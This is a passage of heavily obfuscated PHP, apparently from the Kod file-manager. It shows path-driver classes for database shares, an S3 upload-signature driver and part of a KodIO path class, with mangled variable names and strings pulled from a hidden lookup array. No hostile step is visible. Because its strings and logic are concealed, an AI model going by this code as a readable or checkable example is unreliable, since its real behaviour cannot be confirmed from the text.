$ïå”áˆË, $„‡ÇİµÁ); return $¹ô–ÊèÈ ? $this->getPathOuter($¹ô–ÊèÈ) : !1; } public function moveSameAllow() { } public function move($ÜøÉ‹‚ø, $¥Å¢›ŒÕ, $îñ’˜î€ = REPEAT_REPLACE, $¬¡ÄĞ = false) { $ô®È¸ºß = $this->parse($¥Å¢›ŒÕ); $ÑóŸåÁ™ = $this->model->move($ÜøÉ‹‚ø, $ô®È¸ºß[$_SERVER[ˆ¡¹µ‹Â][475]], $îñ’˜î€, $¬¡ÄĞ); return $ÑóŸåÁ™ ? $this->getPathOuter($ÑóŸåÁ™) : !1; } public function remove($İÙÙ•«í, $º¸—Ì = true) { return $this->model->remove($İÙÙ•«í, $º¸—Ì); } public function rename($‘°»Ç£­, $Ü¾ÔÇ) { $ÚíšøÂ = $this->model->rename($‘°»Ç£­, $Ü¾ÔÇ); return $ÚíšøÂ ? $this->getPathOuter($‘°»Ç£­) : $ÚíšøÂ; } public function size($ƒ­€ğìĞ) { $™ÃŸµ”ú = $this->infoSimple($ƒ­€ğìĞ); return $™ÃŸµ”ú ? $™ÃŸµ”ú[$_SERVER[ˆ¡¹µ‹Â][79]] : 0; } public function infoSimple($œõ“ÃÕ) { return $this->model->sourceInfo($œõ“ÃÕ); } public function info($ŠÜ­«ƒ) { return $this->infoParse($ŠÜ­«ƒ); } public function infoAuth($ş¹€üûÖ) { return $this->infoParse($ş¹€üûÖ, !1, !0); } public function infoWithChildren($Á¿èÛÈ) { return $this->infoParse($Á¿èÛÈ, !0); } protected function infoParse($ŒÈœ‘, $ÔĞ÷‹×Ä = false, $Ö¾Åú = false) { if (!$ÔĞ÷‹×Ä) { return $this->model->pathInfo($ŒÈœ‘, $Ö¾Åú); } return $this->model->pathInfoMore($ŒÈœ‘); } public function infoFullSimple($±³ÌºÒ) { $İ¹èÆ± =& $_SERVER[ˆ¡¹µ‹Â]; $¶·æÏÑ = explode($İ¹èÆ±[8], $±³ÌºÒ); $Üèû¨À = implode($İ¹èÆ±[8], array_splice($¶·æÏÑ, 1)); return $this->model->pathInfoByPath($¶·æÏÑ[0], $Üèû¨À); } public function infoFull($îÑ·à”) { $ğÕõâÄ° = $this->infoFullSimple($îÑ·à”); return is_array($ğÕõâÄ°) ? $this->model->pathInfo($ğÕõâÄ°[$_SERVER[ˆ¡¹µ‹Â][193]]) : !1; } public function hashSimple($ÁóˆÒüì) { $¿å×šõÂ =& $_SERVER[ˆ¡¹µ‹Â]; $Â›¢­ÉÄ = $this->infoWithChildren($ÁóˆÒüì); return $Â›¢­ÉÄ[$¿å×šõÂ[170]][$¿å×šõÂ[672]]; } public function hashMd5($Œœ³ÆÈ) { $”«¾µ· =& $_SERVER[ˆ¡¹µ‹Â]; $ìæÍ²©† = $this->infoWithChildren($Œœ³ÆÈ); return $ìæÍ²©†[$”«¾µ·[170]][$”«¾µ·[547]]; } public function exist($Ø“Í«¢ò) { $óÑ‡ÈŠâ =& $_SERVER[ˆ¡¹µ‹Â]; $™Å¿·Æ = $this->parse($Ø“Í«¢ò); if (!$™Å¿·Æ[$óÑ‡ÈŠâ[87]]) { return $this->isFile($Ø“Í«¢ò) || $this->isFolder($Ø“Í«¢ò); } $»Ù²—Ú• = array($óÑ‡ÈŠâ[477] => $™Å¿·Æ[$óÑ‡ÈŠâ[475]], $óÑ‡ÈŠâ[32] => $™Å¿·Æ[$óÑ‡ÈŠâ[87]]); $èß©ĞèÉ = $this->model->where($»Ù²—Ú•)->find(); return $èß©ĞèÉ ? !0 : !1; } public function isFile($é‡ê¾³î) { $­»ığâï =& $_SERVER[ˆ¡¹µ‹Â]; $€˜’Òƒ² = $this->infoSimple($é‡ê¾³î); return $€˜’Òƒ² && $€˜’Òƒ²[$­»ığâï[485]] == $­»ığâï[228] ? !0 : !1; } public function isFolder($ºŒ²Ã»Ñ) { $İŠ¯Õ¯­ =& $_SERVER[ˆ¡¹µ‹Â]; $è¤›Ä°± = $this->infoSimple($ºŒ²Ã»Ñ); return $è¤›Ä°± && $è¤›Ä°±[$İŠ¯Õ¯­[485]] == $İŠ¯Õ¯­[91] ? !0 : !1; } public function listPath($’àø·¸§, $Ù’Ş‡Ä¿ = false) { $Şğ£å“– =& $_SERVER[ˆ¡¹µ‹Â]; if ($’àø·¸§ == $Şğ£å“–[12]) { return !1; } $Ùñ§õËÒ = array($Şğ£å“–[477] => $’àø·¸§); if ($Ù’Ş‡Ä¿) { return $this->model->listSource($Ùñ§õËÒ, -1); } return $this->model->listSource($Ùñ§õËÒ); } public function has($×ü˜†ñ, $ÓûèÜâî = false, $õŠ‰ú¶‡ = null) { $¥”—èªÓ =& $_SERVER[ˆ¡¹µ‹Â]; $Êæ›Ì ç = $this->infoWithChildren($×ü˜†ñ); if ($ÓûèÜâî) { return array($¥”—èªÓ[240] => $Êæ›Ì ç[$¥”—èªÓ[240]], $¥”—èªÓ[239] => $Êæ›Ì ç[$¥”—èªÓ[239]]); } return $õŠ‰ú¶‡ ? $Êæ›Ì ç[$¥”—èªÓ[240]] : $Êæ›Ì ç[$¥”—èªÓ[239]]; } public function listAll($ŸÓµ¯à±) { $…ÍÈ¶Š  = IO::info($this->pathParse[$_SERVER[ˆ¡¹µ‹Â][87]]); if (!$…ÍÈ¶Š ) { return array(); } return $this->model->listAll($ŸÓµ¯à±); } public function getContent($”ğĞ„™Ë) { return $this->model->getContent($”ğĞ„™Ë); } public function setContent($Ç†İ¦«ƒ, $‚‰‡Û‚ = '') { return $this->model->setContent($Ç†İ¦«ƒ, $‚‰‡Û‚); } public function fileSubstr($öµæŞ´æ, $Óƒ¸ßéğ, $´ŠïÀš½) { return $this->model->fileSubstr($öµæŞ´æ, $Óƒ¸ßéğ, $´ŠïÀš½); } public function download($®ı÷ş¶¥, $®òè»ÍÒ = '') { $»Ï†¢µõ = get_path_father($®òè»ÍÒ); $ÖŸ•ìÄ = get_path_this($®òè»ÍÒ); $œ°Ë‰Ï¦ = $this->model->fileInfoGet($®ı÷ş¶¥); $·ƒ†Èƒï = IO::copy($œ°Ë‰Ï¦[$_SERVER[ˆ¡¹µ‹Â][87]], $»Ï†¢µõ, !1, $ÖŸ•ìÄ); return $·ƒ†Èƒï; } public function setModifyTime($€—ø­ŒŠ, $€ü€¡² = '') { $àÇ’õÌÒ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$€—ø­ŒŠ) { return; } $this->model->where(array($àÇ’õÌÒ[491] => $€—ø­ŒŠ))->save(array($àÇ’õÌÒ[88] => $€ü€¡²)); } public function upload($şÖÂşŞÇ, $ø—ŒĞÅ, $çÊ²ŸÙõ = false, $«Í¹¼¦… = REPEAT_REPLACE) { $¨¥ÃÉãÇ =& $_SERVER[ˆ¡¹µ‹Â]; $ÇÉ¸ÖÑé = $this->parse($şÖÂşŞÇ); $©„Ë¿Î» = $this->model->addFile($ÇÉ¸ÖÑé[$¨¥ÃÉãÇ[475]], $ø—ŒĞÅ, $ÇÉ¸ÖÑé[$¨¥ÃÉãÇ[87]], $çÊ²ŸÙõ, $«Í¹¼¦…); return $this->getPathOuter($©„Ë¿Î»); } public function uploadFileByID($¿´‘ÊØï, $¶Ó–¨ïó, $¾çÍêë¥) { $„Àö =& $_SERVER[ˆ¡¹µ‹Â]; $ª¾¨³šâ = $this->parse($¿´‘ÊØï); $˜Æáİ„š = $this->model->addFileByFileID($ª¾¨³šâ[$„Àö[475]], $¶Ó–¨ïó, $ª¾¨³šâ[$„Àö[87]], $¾çÍêë¥); return $this->getPathOuter($˜Æáİ„š); } public function addFileByRemote($øæÇ¦Ë°, $«˜é¡¢, $³ƒ´¹™– = array(), $ûçÙ¢Øû = '', $©Ü°¨‹è) { $şÎİÄÜ  =& $_SERVER[ˆ¡¹µ‹Â]; $²Ã‡¶· = $this->parse($øæÇ¦Ë°); $ûçÙ¢Øû = empty($ûçÙ¢Øû) ? $²Ã‡¶·[$şÎİÄÜ [87]] : $ûçÙ¢Øû; $‘™¾ûÍ = $this->model->addFileByRemote($²Ã‡¶·[$şÎİÄÜ [475]], $«˜é¡¢, $ûçÙ¢Øû, $³ƒ´¹™–, $©Ü°¨‹è); return $this->getPathOuter($‘™¾ûÍ); } public function uploadLink($å¥˜Ğñ, $ü­Ãƒş¨ = 0) { $’ÑÕ§˜ï =& $_SERVER[ˆ¡¹µ‹Â]; $Íùâ ›û = $this->parse($å¥˜Ğñ); $Éòú†Ñˆ = _get($GLOBALS[$’ÑÕ§˜ï[7]], $’ÑÕ§˜ï[1413]); $ŸÇôÏóÈ = _get($GLOBALS[$’ÑÕ§˜ï[7]], $’ÑÕ§˜ï[1414]); $å¥˜Ğñ = Model($’ÑÕ§˜ï[674])->createFileName($Íùâ ›û[$’ÑÕ§˜ï[87]], $Éòú†Ñˆ, $ŸÇôÏóÈ); return IO::uploadLink($å¥˜Ğñ, $ü­Ãƒş¨); } public function fileNameAuto($°ºß È×, $Î–ÎÚ¿Û, $û¯©åîù = REPEAT_REPLACE, $•‘â¼“Û = false) { return $this->model->fileNameAuto($°ºß È×, $Î–ÎÚ¿Û, $û¯©åîù, $•‘â¼“Û); } public function fileNameExist($¤âß•Êã, $úªº²¿ø) { return $this->model->fileNameExist($¤âß•Êã, $úªº²¿ø); } protected function _fileOut($˜ç‹Œ÷, $¶¸©– = false, $µúïáéş = false, $âÌ³ú®Ë = '', $ûÏÄ±’ò = false) { $ÖµÂıÀ¸ =& $_SERVER[ˆ¡¹µ‹Â]; $·Üí±îÀ = $this->model->sourceInfo($˜ç‹Œ÷); if ($·Üí±îÀ[$ÖµÂıÀ¸[485]] == $ÖµÂıÀ¸[91]) { header($ÖµÂıÀ¸[1415]); die; } $ÃˆÕ¯€ö = $this->model->fileInfoGet($˜ç‹Œ÷); $âÌ³ú®Ë = $ÃˆÕ¯€ö[$ÖµÂıÀ¸[547]] ? $ÃˆÕ¯€ö[$ÖµÂıÀ¸[547]] : $âÌ³ú®Ë; $À‰¿Úë» = isset($GLOBALS[$ÖµÂıÀ¸[182]]) && is_array($GLOBALS[$ÖµÂıÀ¸[182]]) ? $GLOBALS[$ÖµÂıÀ¸[182]][$ÖµÂıÀ¸[32]] : $·Üí±îÀ[$ÖµÂıÀ¸[32]]; if ($ûÏÄ±’ò) { return IO::fileOutServer($ÃˆÕ¯€ö[$ÖµÂıÀ¸[87]], $¶¸©–, $À‰¿Úë», $âÌ³ú®Ë); } IO::fileOut($ÃˆÕ¯€ö[$ÖµÂıÀ¸[87]], $¶¸©–, $À‰¿Úë», $âÌ³ú®Ë); } public function fileOut($¨¤±¤‰, $ï‹•Ø‚‘ = false, $€¥£šÙó = false, $‰ë©œ§ = '') { $this->_fileOut($¨¤±¤‰, $ï‹•Ø‚‘, $€¥£šÙó, $‰ë©œ§); } public function fileOutServer($ù”’‹·, $©¾¾£×» = false, $¥×Ê–°ü = false, $ªµÀ‡ì¹ = '') { $this->_fileOut($ù”’‹·, $©¾¾£×», $¥×Ê–°ü, $ªµÀ‡ì¹, !0); } protected function _fileOutImage($á®îéıÏ, $›µŸ«ü = 250) { $¢¹Í¥ =& $_SERVER[ˆ¡¹µ‹Â]; $¦‹±ìÅø = $this->model->pathInfo($á®îéıÏ); if ($¦‹±ìÅø[$¢¹Í¥[485]] == $¢¹Í¥[91]) { show_json($¢¹Í¥[1416] . $á®îéıÏ, !1); } $Ûğ–Éø§ = $this->model->fileInfoGet($á®îéıÏ); $¦‹±ìÅø[$¢¹Í¥[183]] = $Ûğ–Éø§[$¢¹Í¥[87]]; $GLOBALS[$¢¹Í¥[182]] = $¦‹±ìÅø; IO::fileOutImage($Ûğ–Éø§[$¢¹Í¥[87]], $›µŸ«ü); } public function fileOutImage($àÆêö«…, $ñÍõÛµ‡ = 250) { $this->_fileOutImage($àÆêö«…, $ñÍõÛµ‡); } public function fileOutImageServer($åÉ’–±¥, $ƒšÚÅ¤ = 250) { $this->_fileOutImage($åÉ’–±¥, $ƒšÚÅ¤); } public function link($­şÆË, $É‡³¡çì = '') { $±Ã„‡ƒÈ = $this->model->fileInfoGet($­şÆË); return IO::link($±Ã„‡ƒÈ[$_SERVER[ˆ¡¹µ‹Â][87]], $É‡³¡çì); } protected function parse($ŞŠ£ë¿) { $ö¸•ª¤å =& $_SERVER[ˆ¡¹µ‹Â]; if (strstr($ŞŠ£ë¿, $ö¸•ª¤å[8]) === !1) { return array($ö¸•ª¤å[493] => intval($ŞŠ£ë¿), $ö¸•ª¤å[87] => $ö¸•ª¤å[12], $ö¸•ª¤å[1412] => array()); } $ÅÎåİƒË = explode($ö¸•ª¤å[8], trim($ŞŠ£ë¿, $ö¸•ª¤å[8])); if (count($ÅÎåİƒË) < 2) { show_tips(clear_html($ŞŠ£ë¿) . $ö¸•ª¤å[1417]); } return array($ö¸•ª¤å[493] => intval($ÅÎåİƒË[0]), $ö¸•ª¤å[87] => $ÅÎåİƒË[1], $ö¸•ª¤å[1412] => array_slice($ÅÎåİƒË, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¸•·˜) { $this->pathParse = $¸•·˜; $this->model = Model($_SERVER[ˆ¡¹µ‹Â][1411]); } public function getPathOuter($í¡…ÃØø) { $Ÿ†€¬šÎ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$í¡…ÃØø) { return $í¡…ÃØø; } $Şáşºº¹ = $this->parse($í¡…ÃØø); return trim(KodIO::makeShare($this->pathParse[$Ÿ†€¬šÎ[475]], $Şáşºº¹[$Ÿ†€¬šÎ[475]]), $Ÿ†€¬šÎ[8]); } protected function infoParse($øì·Êêµ, $Æ¬äç‡ = false, $•çÁçØæ = false) { $¼„æš¢ =& $_SERVER[ˆ¡¹µ‹Â]; $·æÅ•¿ = $this->pathParse[$¼„æš¢[475]]; $ş¬ãª‡ = trim($this->pathParse[$¼„æš¢[1243]], $¼„æš¢[8]); return Action($¼„æš¢[1418])->sharePathInfo($·æÅ•¿, $ş¬ãª‡, $Æ¬äç‡); } public function infoFull($ĞåÍĞµ) { $ÅŸåÅ¯ß =& $_SERVER[ˆ¡¹µ‹Â]; $€ÙÖè¡ = explode($ÅŸåÅ¯ß[8], trim($ĞåÍĞµ, $ÅŸåÅ¯ß[8])); if (count($€ÙÖè¡) > 1) { $¬Üå¤ÆÁ = implode($ÅŸåÅ¯ß[8], array_splice($€ÙÖè¡, 1)); $€¶·áàÉ = $this->model->pathInfoByPath($€ÙÖè¡[0], $¬Üå¤ÆÁ); if (!$€¶·áàÉ) { return !1; } $this->pathParse[$ÅŸåÅ¯ß[1243]] = $€¶·áàÉ[$ÅŸåÅ¯ß[193]]; } return $this->infoParse($ĞåÍĞµ); } public function listAll($–ê‰ì§¨) { $ÃÎ©ù• =& $_SERVER[ˆ¡¹µ‹Â]; $ÊåÎ•÷ø = IO::info($this->pathParse[$ÃÎ©ù•[87]]); if (!$ÊåÎ•÷ø) { return array(); } $ŒÄÙÛ×Ì = $this->model->listAll($–ê‰ì§¨); $›Âã”»Ä = Model($ÃÎ©ù•[664])->getInfo($ÊåÎ•÷ø[$ÃÎ©ù•[665]]); foreach ($ŒÄÙÛ×Ì as &$±çöÍöå) { check_abort(); $±çöÍöå[$ÃÎ©ù•[90]] = Action($ÃÎ©ù•[1418])->_shareItemeParse($±çöÍöå[$ÃÎ©ù•[90]], $›Âã”»Ä); } unset($±çöÍöå); return $ŒÄÙÛ×Ì; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¦¡šÄ º) { $this->pathParse = $¦¡šÄ º; $this->model = Model($_SERVER[ˆ¡¹µ‹Â][1411]); } protected function infoParse($ñÏ°Äæ×, $ë‰ÒÏªğ = false, $İˆ²ÅÙŞ = false) { $œş¥æèÑ =& $_SERVER[ˆ¡¹µ‹Â]; return Action($œş¥æèÑ[1249])->sharePathInfo($this->pathParse[$œş¥æèÑ[87]], !0, $ë‰ÒÏªğ); } public function listPath($È…Šƒ¨º, $Ìâê²€â = false) { $Î€ğ÷Ëë =& $_SERVER[ˆ¡¹µ‹Â]; $ˆ‡¨ÊÉ = parent::listPath($È…Šƒ¨º, $Ìâê²€â); if (!$ˆ‡¨ÊÉ) { return $ˆ‡¨ÊÉ; } if (is_array($ˆ‡¨ÊÉ[$Î€ğ÷Ëë[1419]])) { $ˆ‡¨ÊÉ[$Î€ğ÷Ëë[1419]] = Action($Î€ğ÷Ëë[1249])->shareItemInfo($ˆ‡¨ÊÉ[$Î€ğ÷Ëë[1419]]); } foreach ($ˆ‡¨ÊÉ as $‡ï—êáª => $Ğù­ü­«) { if (!in_array($‡ï—êáª, array($Î€ğ÷Ëë[86], $Î€ğ÷Ëë[85]))) { continue; } foreach ($Ğù­ü­« as $îÜ­ñå => $õêÍÔ§) { $ˆ‡¨ÊÉ[$‡ï—êáª][$îÜ­ñå] = Action($Î€ğ÷Ëë[1249])->shareItemInfo($õêÍÔ§); } } return $ˆ‡¨ÊÉ; } public function listAll($šÙöØ) { $º©õèİñ =& $_SERVER[ˆ¡¹µ‹Â]; $™™ŒÎÇÁ = IO::info($this->pathParse[$º©õèİñ[87]]); if (!$™™ŒÎÇÁ) { return array(); } $óŠÉ´û¶ = $this->model->listAll($šÙöØ); foreach ($óŠÉ´û¶ as &$İû°ø×) { $İû°ø×[$º©õèİñ[90]] = Action($º©õèİñ[1249])->shareItemInfo($İû°ø×[$º©õèİñ[90]]); } unset($İû°ø×); return $óŠÉ´û¶; } } goto a¸Œ®ª¡Šˆ; bÈ ¨­¢¸í: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ûõå™Ä”) { parent::__construct($Ûõå™Ä”); } public function uploadFormData($…€¢ÈÏò, $ÁƒïÇïû = 3600) { $ãìò Œü =& $_SERVER[ˆ¡¹µ‹Â]; $ÈÁ³Äš = $ãìò Œü[229]; $µÕãå‚ø = $ãìò Œü[270]; $­ Îò• = $ãìò Œü[62]; $ÏòùÔ“ü = gmdate($ãìò Œü[271]); $çÊÍñÜ = gmdate($ãìò Œü[272]); $èÀîƒ‡ = $ãìò Œü[273]; $í¡Ó„®« = $ÁƒïÇïû . $ãìò Œü[12]; $˜±¼óçÔ = $ãìò Œü[274]; $¹ÃÔ¼ïÜ = array($this->accessKey, $çÊÍñÜ, $this->region, $­ Îò•, $èÀîƒ‡); $§Ñëùş” = implode($ãìò Œü[8], $¹ÃÔ¼ïÜ); $ıÖå³–¸ = array($ãìò Œü[275] => gmdate($ãìò Œü[299], strtotime($ãìò Œü[277])), $ãìò Œü[278] => array(array($ãìò Œü[279] => $this->bucket), array($ãìò Œü[280] => $ÈÁ³Äš), array($ãìò Œü[281], $ãìò Œü[282], $ãìò Œü[12]), array($ãìò Œü[281], $ãìò Œü[283], $ãìò Œü[12]), array($ãìò Œü[281], $ãìò Œü[284], $ãìò Œü[12]), array($ãìò Œü[285] => $˜±¼óçÔ), array($ãìò Œü[286] => $§Ñëùş”), array($ãìò Œü[287] => $µÕãå‚ø), array($ãìò Œü[288] => $ÏòùÔ“ü), array($ãìò Œü[289] => $í¡Ó„®«))); $Ãôœœ = base64_encode(json_encode($ıÖå³–¸)); $òº«‚çË = hash_hmac($ãìò Œü[290], $çÊÍñÜ, $ãìò Œü[291] . $this->secret, !0); $°¬øùã = hash_hmac($ãìò Œü[290], $this->region, $òº«‚çË, !0); $Êİ†Şø— = hash_hmac($ãìò Œü[290], $­ Îò•, $°¬øùã, !0); $Æªî¶™Ù = hash_hmac($ãìò Œü[290], $èÀîƒ‡, $Êİ†Şø—, !0); $³ÒÕï¥ı = hash_hmac($ãìò Œü[290], $Ãôœœ, $Æªî¶™Ù); $áèÑ‚ä‘ = array($ãìò Œü[246] => $ãìò Œü[12], $ãìò Œü[292] => $ãìò Œü[12], $ãìò Œü[280] => $ÈÁ³Äš, $ãìò Œü[285] => $˜±¼óçÔ, $ãìò Œü[293] => $Ãôœœ, $ãìò Œü[294] => $§Ñëùş”, $ãìò Œü[295] => $µÕãå‚ø, $ãìò Œü[296] => $ÏòùÔ“ü, $ãìò Œü[297] => $í¡Ó„®«, $ãìò Œü[298] => $³ÒÕï¥ı, $ãìò Œü[208] => $this->getHost()); return $áèÑ‚ä‘; } public function multiUploadFormData($„—æ«÷Œ, $Š³ûúˆ = 3600) { $ÏÒÆû’ƒ =& $_SERVER[ˆ¡¹µ‹Â]; $âï²Äà— = gmdate($ÏÒÆû’ƒ[300]); $¬€±Ú = array(); $Å—ëô­£ = $this->client->getUploadId($this->bucket, $„—æ«÷Œ, $¬€±Ú); if (!$Å—ëô­£) { return !1; } return array($ÏÒÆû’ƒ[254] => $Å—ëô­£, $ÏÒÆû’ƒ[208] => $this->getHost() . $ÏÒÆû’ƒ[8] . $this->pathEncode($„—æ«÷Œ), $ÏÒÆû’ƒ[255] => $âï²Äà—, $ÏÒÆû’ƒ[97] => $„—æ«÷Œ); } public function multiUploadAuthData($¦æãÆ, $¤›ùöÈœ = array()) { $×º´ÂË¼ =& $_SERVER[ˆ¡¹µ‹Â]; $¬°ô£ = isset($¤›ùöÈœ[$×º´ÂË¼[169]]) ? $¤›ùöÈœ[$×º´ÂË¼[169]] : $×º´ÂË¼[12]; $ÊºŞ½Î¬ = $¤›ùöÈœ[$×º´ÂË¼[97]]; unset($¤›ùöÈœ[$×º´ÂË¼[97]]); if (isset($¤›ùöÈœ[$×º´ÂË¼[256]])) { return $this->listUploadParts($ÊºŞ½Î¬, $¤›ùöÈœ); } $¡Á­°úŒ = array(); if (isset($¤›ùöÈœ[$×º´ÂË¼[301]])) { $¡Á­°úŒ[$×º´ÂË¼[302]] = $¤›ùöÈœ[$×º´ÂË¼[301]]; } $œ®¹Û = explode($×º´ÂË¼[210], $this->getHost()); $“Îµ¯‰¥ = array($×º´ÂË¼[303] => $œ®¹Û[1], $×º´ÂË¼[304] => $×º´ÂË¼[12], $×º´ÂË¼[246] => $×º´ÂË¼[123], $×º´ÂË¼[292] => $¤›ùöÈœ[$×º´ÂË¼[79]]); $îÇ¼È¿» = $×º´ÂË¼[259]; $ÔÑè³‡‚ = $×º´ÂË¼[8] . $this->pathEncode($ÊºŞ½Î¬) . $¬°ô£; $Öø—¯­ = $this->client->__getSignatureV4($¡Á­°úŒ, $“Îµ¯‰¥, $îÇ¼È¿», $ÔÑè³‡‚); if (strpos($¬°ô£, $×º´ÂË¼[258]) === 0) { if (isset($¡Á­°úŒ[$×º´ÂË¼[302]])) { $ı Ñ‘› = $¡Á­°úŒ[$×º´ÂË¼[302]]; } else { if (isset($Öø—¯­[$×º´ÂË¼[302]])) { $ı Ñ‘› = $Öø—¯­[$×º´ÂË¼[302]]; } else { $ı Ñ‘› = hash($×º´ÂË¼[290], $×º´ÂË¼[12]); } } return array($×º´ÂË¼[265] => $Öø—¯­[$×º´ÂË¼[265]], $×º´ÂË¼[302] => $ı Ñ‘›, $×º´ÂË¼[255] => $Öø—¯­[$×º´ÂË¼[305]]); } return $Öø—¯­[$×º´ÂË¼[265]]; } public function listUploadParts($˜˜²…úÌ, $åæ’Çç = array()) { $ôÒ¡Î¡ =& $_SERVER[ˆ¡¹µ‹Â]; $ùËÌá÷ = str_replace($ôÒ¡Î¡[266], $ôÒ¡Î¡[12], $åæ’Çç[$ôÒ¡Î¡[169]]); $¢Ïœ½Îò = $this->client->listParts($this->bucket, $˜˜²…úÌ, $ùËÌá÷); if (!$¢Ïœ½Îò) { return !1; } $›òœµÃ = $ôÒ¡Î¡[306]; foreach ($¢Ïœ½Îò as $¡´ËÑŠÚ) { $›òœµÃ .= $ôÒ¡Î¡[307] . "\x3c\x50\141\x72\x74\x4e\x75\x6d\x62\x65\x72\76{$¡´ËÑŠÚ[$ôÒ¡Î¡[308]]}\x3c\57\120\x61\x72\x74\x4e\165\x6d\x62\x65\x72\x3e\xa" . "\74\x45\x54\x61\147\76{$¡´ËÑŠÚ[$ôÒ¡Î¡[309]]}\74\57\x45\124\x61\147\x3e\12" . $ôÒ¡Î¡[310]; } $›òœµÃ .= $ôÒ¡Î¡[311]; $å¢½´ı¤ = array(); $ôÛ»ÄúÓ = explode($ôÒ¡Î¡[210], $this->getHost()); $¤†·ö× = array($ôÒ¡Î¡[303] => $ôÛ»ÄúÓ[1], $ôÒ¡Î¡[246] => $ôÒ¡Î¡[123], $ôÒ¡Î¡[292] => strlen($›òœµÃ)); $€•à€›„ = $ôÒ¡Î¡[257]; $•óÚÍı = $ôÒ¡Î¡[8] . $this->pathEncode($˜˜²…úÌ) . $åæ’Çç[$ôÒ¡Î¡[169]]; $óˆ“²Ä¢ = $this->client->__getSignatureV4($å¢½´ı¤, $¤†·ö×, $€•à€›„, $•óÚÍı, $›òœµÃ); return array($ôÒ¡Î¡[265] => $óˆ“²Ä¢[$ôÒ¡Î¡[265]], $ôÒ¡Î¡[255] => $óˆ“²Ä¢[$ôÒ¡Î¡[305]], $ôÒ¡Î¡[267] => $¢Ïœ½Îò, $ôÒ¡Î¡[302] => $óˆ“²Ä¢[$ôÒ¡Î¡[302]]); } public function link($ÀœÅÍÉ¿, $€çÓ²ù¼ = array()) { return parent::link($ÀœÅÍÉ¿, $€çÓ²ù¼); } public function fileOut($³—Ãûí, $ìí¢âÒ = false, $¶˜ëæ„¨ = false, $ÑÎØ•ƒÚ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ˆ¡¹µ‹Â][312])) { return parent::fileOutServer($³—Ãûí, $ìí¢âÒ, $¶˜ëæ„¨, $ÑÎØ•ƒÚ); } parent::fileOut($³—Ãûí, $ìí¢âÒ, $¶˜ëæ„¨, $ÑÎØ•ƒÚ); } public function fileOutImage($öˆ©ÑÇ‘, $âÒ’ƒ­¯ = 250) { if (strstr($this->endpoint, $_SERVER[ˆ¡¹µ‹Â][312])) { return parent::fileOutImageServer($öˆ©ÑÇ‘, $âÒ’ƒ­¯); } parent::fileOutImage($öˆ©ÑÇ‘, $âÒ’ƒ­¯); } public function fileOutLink($–“µ¾Ô) { $Ö˜¬ =& $_SERVER[ˆ¡¹µ‹Â]; if (substr($–“µ¾Ô, 0, 7) == $Ö˜¬[313]) { $–“µ¾Ô = $Ö˜¬[314] . substr($–“µ¾Ô, 7); } header($Ö˜¬[175] . $–“µ¾Ô); die; } } define($_SERVER[ˆ¡¹µ‹Â][315], 1); define($_SERVER[ˆ¡¹µ‹Â][316], 2); goto CãŒŞÀ®²Õ; BÏÓªÁ Ì¾: class KodIO { const KOD_SOURCE = "\x7b\163\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\122\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\x46\151\x6c\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\x46\151\x6c\x65\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\165\x70\x52\157\x6f\164\x53\145\154\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\x72\x53\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\162\x53\150\x61\162\145\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\x65\124\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\162\x65\x49\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\141\x72\145\111\x74\x65\x6d\114\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\x65\x61\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\143\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\145\156\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\x65\162\x7d"; public static function typeList() { $”ŒËë‘ =& $_SERVER[ˆ¡¹µ‹Â]; return array($”ŒËë‘[1329] => self::KOD_SOURCE, $”ŒËë‘[1330] => self::KOD_USER_RECYCLE, $”ŒËë‘[1331] => self::KOD_USER_FAV, $”ŒËë‘[1332] => self::KOD_USER_FILE_TAG, $”ŒËë‘[1333] => self::KOD_USER_FILE_TYPE, $”ŒËë‘[1334] => self::KOD_GROUP_ROOT_SELF, $”ŒËë‘[1335] => self::KOD_USER_SHARE, $”ŒËë‘[1336] => self::KOD_USER_SHARE_LINK, $”ŒËë‘[1337] => self::KOD_USER_SHARE_TO_ME, $”ŒËë‘[1338] => self::KOD_SHARE_ITEM, $”ŒËë‘[1339] => self::KOD_SHARE_LINK, $”ŒËë‘[1340] => self::KOD_SEARCH, $”ŒËë‘[1341] => self::KOD_BLOCK, $”ŒËë‘[1342] => self::KOD_IO, $”ŒËë‘[1343] => self::KOD_USER_RECENT, $”ŒËë‘[1344] => self::KOD_USER_DRIVER); } public static function parse($Ì‡Çß‘Ù) { $¿†ˆ”• =& $_SERVER[ˆ¡¹µ‹Â]; $Ì‡Çß‘Ù = self::clear($Ì‡Çß‘Ù); $£ô—¬âˆ = array_values(self::typeList()); preg_match($¿†ˆ”•[1345], $Ì‡Çß‘Ù, $ã×æ¡¨‰); $‹°ŸÀ€œ = array($¿†ˆ”•[496] => !1, $¿†ˆ”•[1346] => !1, $¿†ˆ”•[493] => !1, $¿†ˆ”•[87] => $Ì‡Çß‘Ù, $¿†ˆ”•[1244] => !1, $¿†ˆ”•[1243] => $¿†ˆ”•[12]); if (is_array($ã×æ¡¨‰) && count($ã×æ¡¨‰) == 5) { $ß¸£¸Ö‰ = $¿†ˆ”•[1347] . $ã×æ¡¨‰[2] . $¿†ˆ”•[403]; if (in_array($ß¸£¸Ö‰, $£ô—¬âˆ)) { $‹°ŸÀ€œ[$¿†ˆ”•[1244]] = 